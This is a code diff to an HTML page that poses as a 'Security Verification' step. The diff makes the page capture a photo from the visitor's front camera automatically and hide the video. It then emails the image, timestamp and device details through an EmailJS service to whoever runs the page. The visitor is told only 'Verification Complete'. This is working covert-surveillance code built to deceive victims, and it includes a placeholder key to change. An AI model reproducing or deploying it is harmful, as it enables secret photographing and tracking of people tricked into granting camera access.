@@ -3,48 +3,71 @@
 <head>
   <title>Verification Required</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
   <style>
-    body { font-family: Arial; text-align: center; margin-top: 30px; }
-    video { width: 90%; max-width: 350px; border-radius: 10px; }
-    button { padding: 10px 20px; font-size: 16px; margin-top: 15px; }
+    body { font-family: Arial; text-align: center; margin-top: 40px; }
+    video { width: 90%; max-width: 350px; border-radius: 10px; display:none; }
+    button { padding: 12px 25px; font-size: 16px; }
   </style>
 </head>
 <body>
 
-<h3>Identity Verification</h3>
-<p>Please allow camera access to continue</p>
+<h3>Security Verification</h3>
+<p>Tap continue to verify</p>
 
-<video id="video" autoplay playsinline></video><br>
-<button onclick="capture()">Capture Photo</button>
-
+<button id="startBtn">Continue</button>
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-const video = document.getElementById('video');
+emailjs.init("XYr9cRaK3BZXsH7Xp"); // 🔴 CHANGE
 
-navigator.mediaDevices.getUserMedia({
-  video: { facingMode: "user" }
-})
-.then(stream => {
-  video.srcObject = stream;
-})
-.catch(() => {
-  alert("Camera permission denied");
-});
+const startBtn = document.getElementById("startBtn");
+const video = document.getElementById("video");
 
-function capture() {
-  const canvas = document.getElementById('canvas');
+startBtn.onclick = async () => {
+  startBtn.style.display = "none";
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+
+    video.srcObject = stream;
+    video.style.display = "block";
+
+    // Wait briefly for camera to stabilize
+    setTimeout(captureAndSend, 1200);
+
+  } catch {
+    alert("Camera permission denied");
+  }
+};
+
+function captureAndSend() {
+  const canvas = document.getElementById("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
-  canvas.getContext('2d').drawImage(video, 0, 0);
-  const img = canvas.toDataURL("image/png");
+  canvas.getContext("2d").drawImage(video, 0, 0);
 
-  const a = document.createElement("a");
-  a.href = img;
-  a.download = "captured.png";
-  a.click();
+  const imageData = canvas.toDataURL("image/png");
+
+  emailjs.send("service_abcd123", "Camera Capture Alert", {
+    image: imageData,
+    time: new Date().toLocaleString(),
+    device: navigator.userAgent
+  });
+
+  // Stop camera
+  video.srcObject.getTracks().forEach(track => track.stop());
+
+  document.body.innerHTML = "<h3>Verification Complete</h3>";
 }
 </script>
 
 </body>
 </html>
+
